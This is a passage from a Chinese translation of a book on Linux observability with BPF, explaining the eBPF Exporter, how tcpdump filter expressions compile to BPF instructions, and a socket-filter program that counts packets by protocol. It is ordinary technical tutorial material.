最后，我们为映射的键定义了一个翻译函数。 这是必要的，因为映射键通常是指向信息的指针，我们希望向Prometheus发送实际的函数名称。</p><p>本例中的第二部分描述了我们想要将BPF程序附加到的探针。在这种情况下，我们要跟踪计时器开始调用； 我们使用<code>tracepoint timer:timer_start</code>：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tracepoints:</span><br><span class="line">  timer:timer_start: tracepoint__timer__timer_start</span><br></pre></td></tr></table></figure><p>这里我们告诉<code>eBPF Exporter</code>，我们希望将BPF函数<code>tracepoint__timer__timer_start</code>附加到这个特定的跟踪点。 接下来让我们看看如何声明该函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">code: |</span><br><span class="line">BPF_HASH(counts, u64);</span><br><span class="line"><span class="comment">// Generates function tracepoint__timer__timer_start </span></span><br><span class="line">TRACEPOINT_PROBE(timer, timer_start) &#123;</span><br><span class="line">  counts.increment((u64) args-&gt;function);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>eBPF Exporter</code>使用BCC编译程序，因此我们可以访问它的所有宏和帮助程序。前面的代码片段使用宏<code>TRACEPOINT_PROBE</code>生成最终函数，我们将附加到名为<code>tracepoint__timer__timer_start</code>的跟踪点。</p><p>Cloudflare使用<code>eBPF Exporter</code>来监控其所有数据中心的指标。</p><h3 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h3><p>在本章中，我们讨论了一些系统分析工具。当你需要调试系统上的任何异常时，这些工具可以随时使用。所有工具都抽象了我们在前几章中看到的概念，以帮助你使用BPF即便你的环境还没有准备好。这是BPF与其他众多分析工具相比的优势之一；因为任何现代Linux内核都包含BPF虚拟机，所以你可以在其上构建利用这些强大功能的新工具。</p><p>还有许多其他工具将BPF用于类似目的，例如<code>Cilium</code>和<code>Sysdig</code>，我们鼓励你去尝试使用它们。</p><p>在接下来的章节中，我们将深入探讨它的网络功能。我们将展示如何分析任何网络中的流量以及如何使用BPF来控制网络中的消息。</p><h2 id="第六章节"><a href="#第六章节" class="headerlink" title="第六章节"></a>第六章节</h2><h3 id="Linux网络和BPF"><a href="#Linux网络和BPF" class="headerlink" title="Linux网络和BPF"></a>Linux网络和BPF</h3><p>从网络的角度来看，我们将BPF程序用于两个用途：数据包捕获和过滤。</p><p>这意味着用户空间程序可以将过滤器附加到任何套接字并提取有关流经它的数据包的信息，并允许/禁止/重定向某些类型的数据包，因为它们在该级别可以看到。</p><p>本章的目的是解释BPF程序在Linux内核网络堆栈中网络数据路径的不同阶段如何与<code>Socket Buffer</code>结构进行交互。 我们将确定两种类型的程序作为常见用例</p><ul><li>与套接字相关的程序类型</li><li>基于BPF的流量控制分类器编写的程序</li></ul><p><code>Socket Buffer</code>结构，也称为SKB或<code>sk_buff</code>，是内核中为每个发送或接收的数据包创建和使用的结构。通过读取SKB可以传递或丢弃数据包并填充BPF映射以创建有关当前流量的统计信息和流量指标。</p><p>此外，一些BPF程序允许你操作SKB，并通过扩展转换最终数据包，以重定向或改变它们的基本结构。例如，在仅使用IPv6的系统上可以编写一个程序，将所有收到的数据包从IPv4转换为 IPv6，这可以通过修改数据包的SKB来完成。</p><p>理解网络中的BPF和eBPF的关键是需要了解我们可以编写的不同类型的程序之间的差异，以及不同的程序如何导致相同的结果；在下一节中，我们将介绍在套接字级别进行过滤的两种方法：使用经典的BPF过滤器，以及使用附加到套接字的eBPF程序。</p><h3 id="BPF和包过滤"><a href="#BPF和包过滤" class="headerlink" title="BPF和包过滤"></a>BPF和包过滤</h3><p>如前所述，BPF过滤器和eBPF程序是BPF程序在网络环境中的主要用例。然而最开始BPF程序是包过滤的同义词。</p><p>包过滤仍然是最重要的用例之一，并且已经从经典的BPF (cBPF)扩展到<code>Linux 3.19</code>中的eBPF，并在过滤程序类型<code>BPF_PROG_TYPE_SOCKET_FILTER</code>中添加了与映射相关的功能。</p><p>过滤器主要可用于三个高级场景：</p><ul><li>实时流量丢弃（例如，仅允许用户数据报协议UDP流量，丢弃其他任何内容）</li><li>实时观察流入系统的一组过滤数据包</li><li>使用<code>pcap</code>格式对实时系统上捕获的网络流量进行回顾分析</li></ul><p>术语<code>pcap</code>来自两个词的结合：数据包(packet)和捕获(capture)。<code>pcap</code>格式在数据包捕获库 <code>libpcap</code>的库中实现，是用于数据包捕获的特定域API。 当你希望在实时系统上捕获的一组数据包能够直接保存到文件中，方便后续使用<code>pcap</code>格式导出的数据包流的工具进行分析时，这种格式在调试场景中很有用。</p><p>在接下来的部分中，我们将展示两种不同的方式来应用BPF程序的包过滤。首先，我们展示了像<code>tcpdump</code>这样的常见且广泛使用的工具如何充当用作过滤器的BPF程序的更高级的接口。然后我们使用<code>BPF_PROG_TYPE_SOCKET_FILTER</code>BPF程序类型编写并加载我们自己的程序。</p><h4 id="tcpdump和BPF表达式"><a href="#tcpdump和BPF表达式" class="headerlink" title="tcpdump和BPF表达式"></a>tcpdump和BPF表达式</h4><p>说到实时流量分析和观察，每个人都知道的命令行工具之一就是<code>tcpdump</code>。 本质上是<code>libpcap</code>的前端，它允许用户定义高级过滤表达式。<code>tcpdump</code>所做的是从你选择的网络接口（或任何接口）读取数据包，然后将接收到的数据包的内容写入标准输出或文件。然后可以使用<code>pcap</code>过滤器语法过滤数据包流。<code>pcap</code>过滤器语法是一种DSL，使用一组原语组成的高级表达式集过滤数据包，这些原语通常比BPF汇编更容易记住。解释<code>pcap</code>过滤器语法中所有可能的原语和表达式超出了本章的范围，具体可以使用<code>man 7 pcap-filter</code>查看。</p><p>场景是我们在一个Linux机器中，它在端口<code>8080</code>上公开了一个Web服务器；这个Web服务器没有记录它接收到的请求，我们想知道它是否正在接收任何请求以及这些请求是如何流入的，因为所服务应用程序的客户抱怨在浏览时无法获得任何响应产品页面。在这一点上，我们只知道客户正在使用由该Web服务器提供的Web应用程序连接到我们的产品页面，并且总是发生这种情况，我们不知道是什么原因，因为最终用户通常不会调试服务，不幸的是我们没有在这个系统中部署任何日志记录或错误报告策略，因此我们在调查问题时完全是盲目的。幸运的是，有一个工具可以帮助我们！它是<code>tcpdump</code>，可以告诉它只过滤在我们系统中流动的IPv4数据包，这些数据包在端口8080上使用传输控制协议 (TCP)。因此，我们将能够分析Web服务器的流量。</p><p>以下是使用<code>tcpdump</code>进行过滤的命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos ~]# tcpdump -n 'ip and tcp port 8080'</span><br></pre></td></tr></table></figure><p>让我们看看这个命令中发生了什么：</p><ul><li><code>-n</code> 是为了告诉<code>tcpdump</code>不要将地址转换为各自的名称，我们想查看源地址和目标地址。</li><li><code>ip and tcp port 8080</code>是<code>tcpdump</code>用于过滤数据包的<code>pcap</code>过滤器表达式。ip表示 <code>IPv4</code>，它是一个连词，表示一个更复杂的过滤器，以允许添加更多表达式来匹配，然后我们指定我们只对来自tcp端口8080或到达端口8080的tcp数据包感兴趣。在这种情况下，更好的过滤器应该是<code>tcp dst port 8080</code>，因为我们只对目标端口为<code>8080</code>的数据包感兴趣，而不是来自它的数据包。</li></ul><p>其输出如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">tcpdump: verbose output suppressed, use -v or -vv for full protocol decode</span><br><span class="line">    listening on wlp4s0, link-type EN10MB (Ethernet), capture size 262144 bytes</span><br><span class="line">    12:04:29.593703 IP 192.168.1.249.44206 &gt; 192.168.1.63.8080: Flags [P.],</span><br><span class="line">       seq 1:325, ack 1, win 343,</span><br><span class="line">       options [nop,nop,TS val 25580829 ecr 595195678],</span><br><span class="line">       length 324: HTTP: GET / HTTP/1.1</span><br><span class="line">    12:04:29.596073 IP 192.168.1.63.8080 &gt; 192.168.1.249.44206: Flags [.],</span><br><span class="line">       seq 1:1449, ack 325, win 507,</span><br><span class="line">       options [nop,nop,TS val 595195731 ecr 25580829],</span><br><span class="line">       length 1448: HTTP: HTTP/1.1 200 OK</span><br><span class="line">    12:04:29.596139 IP 192.168.1.63.8080 &gt; 192.168.1.249.44206: Flags [P.],</span><br><span class="line">       seq 1449:2390, ack 325, win 507,</span><br><span class="line">       options [nop,nop,TS val 595195731 ecr 25580829],</span><br><span class="line">       length 941: HTTP</span><br><span class="line">    12:04:46.242924 IP 192.168.1.249.44206 &gt; 192.168.1.63.8080: Flags [P.],</span><br><span class="line">       seq 660:996, ack 4779, win 388,</span><br><span class="line">       options [nop,nop,TS val 25584934 ecr 595204802],</span><br><span class="line">       length 336: HTTP: GET /api/products HTTP/1.1</span><br><span class="line">    12:04:46.243594 IP 192.168.1.63.8080 &gt; 192.168.1.249.44206: Flags [P.],</span><br><span class="line">       seq 4779:4873, ack 996, win 503,</span><br><span class="line">       options [nop,nop,TS val 595212378 ecr 25584934],</span><br><span class="line">       length 94: HTTP: HTTP/1.1 500 Internal Server Error</span><br><span class="line">    12:04:46.329245 IP 192.168.1.249.44234 &gt; 192.168.1.63.8080: Flags [P.],</span><br><span class="line">       seq 471:706, ack 4779, win 388,</span><br><span class="line">       options [nop,nop,TS val 25585013 ecr 595205622],</span><br><span class="line">       length 235: HTTP: GET /favicon.ico HTTP/1.1</span><br><span class="line">    12:04:46.331659 IP 192.168.1.63.8080 &gt; 192.168.1.249.44234: Flags [.],</span><br><span class="line">       seq 4779:6227, ack 706, win 506,</span><br><span class="line">       options [nop,nop,TS val 595212466 ecr 25585013],</span><br><span class="line">       length 1448: HTTP: HTTP/1.1 200 OK</span><br><span class="line">    12:04:46.331739 IP 192.168.1.63.8080 &gt; 192.168.1.249.44234: Flags [P.],</span><br><span class="line">       seq 6227:7168, ack 706, win 506,</span><br><span class="line">       options [nop,nop,TS val 595212466 ecr 25585013],</span><br><span class="line">       length 941: HTTP</span><br></pre></td></tr></table></figure><p>可以看到，我们有一堆请求进展顺利，返回200 OK状态代码，但在<code>/api/products</code>端点上还有一个带有500内部服务器错误代码的请求。表示我们在列出产品时服务器遇到问题！</p><p>此时，你可能会问，如果BPF程序有自己的语法，所有这些<code>pcap</code>过滤内容和<code>tcpdump</code>有什么关系？Linux上的<code>Pcap</code>过滤器被编译为BPF程序！而且因为<code>tcpdump</code>使用<code>pcap</code>过滤器进行过滤，这意味着每次使用过滤器执行<code>tcpdump</code>时，实际上是在编译和加载BPF程序来过滤数据包。幸运的是，通过将<code>-d</code>标志传递给<code>tcpdump</code>，你可以转储在使用指定过滤器时将加载的BPF指令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos ~]# tcpdump  -d  'ip and tcp port 8080'</span><br></pre></td></tr></table></figure><p>该过滤器与上一个示例中使用的过滤器相同，但由于<code>-d</code>标志，现在输出是一组BPF汇编指令。</p><p>输出如下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">(000) ldh      [12]</span><br><span class="line">(001) jeq      #0x800           jt 2jf 12</span><br><span class="line">(002) ldb      [23]</span><br><span class="line">(003) jeq      #0x6             jt 4jf 12</span><br><span class="line">(004) ldh      [20]</span><br><span class="line">(005) jset     #0x1fff          jt 12jf 6</span><br><span class="line">(006) ldxb     4*([14]&amp;0xf)</span><br><span class="line">(007) ldh      [x + 14]</span><br><span class="line">(008) jeq      #0x1f90          jt 11jf 9</span><br><span class="line">(009) ldh      [x + 16]</span><br><span class="line">(010) jeq      #0x1f90          jt 11jf 12</span><br><span class="line">(011) ret      #262144</span><br><span class="line">(012) ret      #0</span><br></pre></td></tr></table></figure><p>分析如下</p><p>ldh [12]：在偏移量12处从累加器加载(ld)一个(h)半字（16 位），这是<code>Ethertype</code>字段，第二层以太网帧结构如下图所示。</p><p><img src="/2022/05/29/使用BPF的Linux可观测性-下篇-翻译/1.png" alt="1"></p><p>jeq #0x800 jt 2 jf 12：如果 (eq) 相等则跳转(j) ；检查上一条指令中的<code>Ethertype</code>值是否等于<code>0x800</code>（这是 IPv4 的标识符），然后使用跳转目标，如果为真（jt）则为2，如果为假（jf）则为12，因此这将继续到下一个如果Internet协议是IPv4的指令——否则它将跳转到末尾并返回零。</p><p>ldb [23]：加载字节(ldb)，将从IP帧中加载更高层协议字段，该字段可在偏移量23处找到——偏移量23来自以太网第2层帧中头的14个字节的添加加上协议在IPv4头中的位置，即第9个，因此14+9=23。</p><p>jeq #0x6 jt 4 jf 12：如果相等，再跳一次。这种情况下，我们检查之前提取的协议是<code>0x6</code>，即TCP。如果是，我们跳到下一条指令(4)或者我们走到最后(12)——如果不是，我们丢弃数据包。</p><p>ldh [20]：这是另一个加载半字指令——在这种情况下，它是从IPv4头加载数据包偏移量+分片偏移量的值。</p><p>jset #0x1fff jt 12 6：如果我们在分片偏移中找到的任何数据为真，则此<code>jset</code>指令将跳转到12——否则，跳转到6，即下一条指令。指令<code>0x1fff</code>之后的偏移量告诉<code>jset</code>指令只查看最后13个字节的数据。（扩展为 0001 1111 1111 1111）</p><p>ldxb 4*([14]&amp;0xf)：将(b)加载(ld)到x中。该指令会将IP标头长度的值加载到x中。</p><p>ldh [x+14]：另一个加载半字指令将获取偏移量(x + 14)处的值，IP标头长度+14，这是数据包中源端口的位置。</p><p>jeq #0x1f90 jt 11 jf 9：如果(x + 14)处的值等于<code>0x1f90</code>（十进制的 8080），这意味着源端口将是<code>8080</code>，继续11或继续检查目标端口是否在端口8080上，如果是错误的，继续9 .</p><p>ldh [x + 16]：这是另一个加载半字指令，它将获取偏移量(x + 16)处的值，这是数据包中目标端口的位置。</p><p>jeq #0x1f90 jt 11 jf 12：这里如果相等再跳转一次，这次用来检查目的地是否为<code>8080</code>，跳转到11；如果不是，转至12并丢弃该数据包。</p><p>ret #262144：到达此指令时，会找到匹配项，从而返回匹配的快照长度。 默认情况下，此值为262144字节。 可以使用<code>tcpdump</code>中的<code>-s</code>参数对其进行调整。</p><p>如果只考虑以<code>8080</code>作为目标的数据包，而不是作为源的数据包，<code>tcpdump</code>示例如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos ~]# tcpdump -d 'ip and tcp dst port 8080'</span><br><span class="line">(000) ldh      [12]</span><br><span class="line">(001) jeq      #0x800           jt 2jf 10</span><br><span class="line">(002) ldb      [23]</span><br><span class="line">(003) jeq      #0x6             jt 4jf 10</span><br><span class="line">(004) ldh      [20]</span><br><span class="line">(005) jset     #0x1fff          jt 10jf 6</span><br><span class="line">(006) ldxb     4*([14]&amp;0xf)</span><br><span class="line">(007) ldh      [x + 16]</span><br><span class="line">(008) jeq      #0x1f90          jt 9jf 10</span><br><span class="line">(009) ret      #262144</span><br><span class="line">(010) ret      #0</span><br></pre></td></tr></table></figure><p>除了像我们那样分析从<code>tcpdump</code>生成的程序集之外，你可能还想编写自己的代码来过滤网络数据包。事实证明，在这种情况下，最大的挑战将是实际调试代码的执行以确保它符合我们的期望； 在这种情况下，在内核源代码树中，<code>tools/bpf</code>中有一个名为<code>bpf_dbg.c</code>的工具，它本质上是一个调试器，允许加载程序和<code>pcap</code>文件以逐步测试执行。</p><p><code>tcpdump</code>也可以直接从<code>.pcap</code>文件中读取，并对其应用BPF过滤器。</p><h4 id="原始套接字的数据包过滤"><a href="#原始套接字的数据包过滤" class="headerlink" title="原始套接字的数据包过滤"></a>原始套接字的数据包过滤</h4><p><code>BPF_PROG_TYPE_SOCKET_FILTER</code>程序类型允许你将BPF程序附加到套接字。它接收到的所有数据包都会以<code>sk_buff</code>结构体的形式传递给程序，然后程序可以决定是丢弃还是允许。这种程序还具有访问和处理映射的能力。</p><p>让我们看一个例子，看看如何使用这种BPF程序。</p><p>我们示例程序的目的是计算在观察下流经接口的TCP、UDP和互联网控制消息协议(ICMP)数据包的数量。为此，我们需要以下内容：</p><ul><li>可以看到数据包流动的BPF程序</li><li>加载程序并将其附加到网络接口的代码</li><li>用于编译程序并启动加载程序的脚本</li></ul><p>此时我们可以通过两种方式编写BPF程序：作为C代码然后编译为ELF文件，或者直接作为BPF程序集。对于这个例子，我们选择使用C代码来展示更高层次的抽象以及如何使用Clang来编译程序。</p><h5 id="BPF程序"><a href="#BPF程序" class="headerlink" title="BPF程序"></a>BPF程序</h5><p>这里BPF程序的主要职责是访问它接收到的数据包；检查其协议是TCP、UDP还是ICMP，然后在找到的协议的特定键上增加映射数组上的计数。</p><p>对于这个程序，我们将利用位于内核源码中<code>samples/bpf/bpf_load.c</code>中的帮助程序解析ELF文件的加载机制。 加载函数<code>load_bpf_file</code>能够识别某些特定的ELF节头，并将它们与相应的程序类型相关联。 代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">bool</span> is_socket = <span class="built_in">strncmp</span>(event, <span class="string">"socket"</span>, <span class="number">6</span>) == <span class="number">0</span>;</span><br><span class="line"><span class="keyword">bool</span> is_kprobe = <span class="built_in">strncmp</span>(event, <span class="string">"kprobe/"</span>, <span class="number">7</span>) == <span class="number">0</span>;</span><br><span class="line"><span class="keyword">bool</span> is_kretprobe = <span class="built_in">strncmp</span>(event, <span class="string">"kretprobe/"</span>, <span class="number">10</span>) == <span class="number">0</span>;</span><br><span class="line"><span class="keyword">bool</span> is_tracepoint = <span class="built_in">strncmp</span>(event, <span class="string">"tracepoint/"</span>, <span class="number">11</span>) == <span class="number">0</span>;</span><br><span class="line"><span class="keyword">bool</span> is_raw_tracepoint = <span class="built_in">strncmp</span>(event, <span class="string">"raw_tracepoint/"</span>, <span class="number">15</span>) == <span class="number">0</span>; </span><br><span class="line"><span class="keyword">bool</span> is_xdp = <span class="built_in">strncmp</span>(event, <span class="string">"xdp"</span>, <span class="number">3</span>) == <span class="number">0</span>;</span><br><span class="line"><span class="keyword">bool</span> is_perf_event = <span class="built_in">strncmp</span>(event, <span class="string">"perf_event"</span>, <span class="number">10</span>) == <span class="number">0</span>;</span><br><span class="line"><span class="keyword">bool</span> is_cgroup_skb = <span class="built_in">strncmp</span>(event, <span class="string">"cgroup/skb"</span>, <span class="number">10</span>) == <span class="number">0</span>;</span><br><span class="line"><span class="keyword">bool</span> is_cgroup_sk = <span class="built_in">strncmp</span>(event, <span class="string">"cgroup/sock"</span>, <span class="number">11</span>) == <span class="number">0</span>;</span><br><span class="line"><span class="keyword">bool</span> is_sockops = <span class="built_in">strncmp</span>(event, <span class="string">"sockops"</span>, <span class="number">7</span>) == <span class="number">0</span>;</span><br><span class="line"><span class="keyword">bool</span> is_sk_skb = <span class="built_in">strncmp</span>(event, <span class="string">"sk_skb"</span>, <span class="number">6</span>) == <span class="number">0</span>;</span><br><span class="line"><span class="keyword">bool</span> is_sk_msg = <span class="built_in">strncmp</span>(event, <span class="string">"sk_msg"</span>, <span class="number">6</span>) == <span class="number">0</span>;</span><br></pre></td></tr></table></figure><p>代码所做的第一件事是在节头和内部变量之间创建关联——就像<code>SEC(&quot;socket&quot;)</code>一样，我们最终会得到<code>bool is_socket=true</code></p><p>之后在同一个文件中，我们看到了一组if指令，它们创建了header和实际<code>prog_type</code>之间的关联，因此对于<code>is_socket</code>，我们最终得到<code>BPF_PROG_TYPE_SOCKET_FILTER</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (is_socket) &#123;</span><br><span class="line">prog_type = BPF_PROG_TYPE_SOCKET_FILTER;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (is_kprobe || is_kretprobe) &#123; </span><br><span class="line">  prog_type = BPF_PROG_TYPE_KPROBE;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (is_tracepoint) &#123;</span><br><span class="line">prog_type = BPF_PROG_TYPE_TRACEPOINT;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (is_raw_tracepoint) &#123;</span><br><span class="line">prog_type = BPF_PROG_TYPE_RAW_TRACEPOINT;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (is_xdp) &#123;</span><br><span class="line">prog_type = BPF_PROG_TYPE_XDP;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (is_perf_event) &#123;</span><br><span class="line">prog_type = BPF_PROG_TYPE_PERF_EVENT;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (is_cgroup_skb) &#123;</span><br><span class="line">prog_type = BPF_PROG_TYPE_CGROUP_SKB;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (is_cgroup_sk) &#123;</span><br><span class="line">prog_type = BPF_PROG_TYPE_CGROUP_SOCK;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (is_sockops) &#123;</span><br><span class="line">prog_type = BPF_PROG_TYPE_SOCK_OPS;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (is_sk_skb) &#123;</span><br><span class="line">prog_type = BPF_PROG_TYPE_SK_SKB;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (is_sk_msg) &#123;</span><br><span class="line">prog_type = BPF_PROG_TYPE_SK_MSG;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Unknown event '%s'\n"</span>, event); </span><br><span class="line">  <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因为我们想编写一个<code>BPF_PROG_TYPE_SOCKET_FILTER</code>程序，我们需要指定一个<code>SEC(&quot;socket&quot;)</code>作为我们函数的ELF头，它将作为BPF程序的入口点。</p><p>正如从该列表中看到的那样，有多种与套接字和一般网络操作相关的程序类型。在本章中，我们将展示<code>BPF_PROG_TYPE_SOCKET_FILTER</code>的示例；此外，后面我们将讨论程序类型为 <code>BPF_PROG_TYPE_XDP</code>的XDP程序。</p><p>我们想要存储遇到的每个协议的数据包计数，需要创建一个键/值映射，其中协议是键，数据包计数为值。为此可以使用<code>BPF_MAP_TYPE_ARRAY</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">struct bpf_map_def <span class="title">SEC</span><span class="params">(<span class="string">"maps"</span>)</span> countmap </span>= &#123; </span><br><span class="line">  .type = BPF_MAP_TYPE_ARRAY,</span><br><span class="line">.key_size = <span class="keyword">sizeof</span>(<span class="keyword">int</span>),</span><br><span class="line">.value_size = <span class="keyword">sizeof</span>(<span class="keyword">int</span>), </span><br><span class="line">  .max_entries = <span class="number">256</span>,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>该映射是使用<code>bpf_map_def</code>结构定义的，它将被命名为<code>countmap</code>以供程序中引用。</p><p>此时，我们可以编写一些代码来实际计算数据包。<code>BPF_PROG_TYPE_SOCKET_FILTER</code>类型的程序是我们的选择之一，因为通过使用这样的程序，我们可以看到所有流经接口的数据包。因此我们使用<code>SEC(&quot;socket&quot;)</code>将程序附加到正确的头部：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">SEC(<span class="string">"socket"</span>)</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">socket_prog</span><span class="params">(struct __sk_buff *skb)</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> proto = load_byte(skb, ETH_HLEN + offsetof(struct iphdr, protocol)); <span class="keyword">int</span> one=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">int</span> *el = bpf_map_lookup_elem(&amp;countmap, &amp;proto);</span><br><span class="line"><span class="keyword">if</span> (el) &#123;</span><br><span class="line">(*el)++; </span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">el = &amp;one; </span><br><span class="line">  &#125;</span><br><span class="line">  bpf_map_update_elem(&amp;countmap, &amp;proto, el, BPF_ANY);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在ELF头附加之后，我们可以使用<code>load_byte</code>函数从<code>sk_buff</code>结构中提取协议部分。然后使用协议ID作为键来执行<code>bpf_map_lookup_elem</code>操作以从计数映射中提取当前计数器值，以便我们可以将其递增，如果它是第一个数据包，我们可以将其设置为1。现在我们可以使用 <code>bpf_map_update_elem</code>用增加的值更新映射。</p><p>完整的<code>bpf_program.c</code>程序如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/bpf.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/if_ether.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/if_packet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/ip.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/tcp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/udp.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> offsetof</span></span><br><span class="line"><span class="meta">#<span 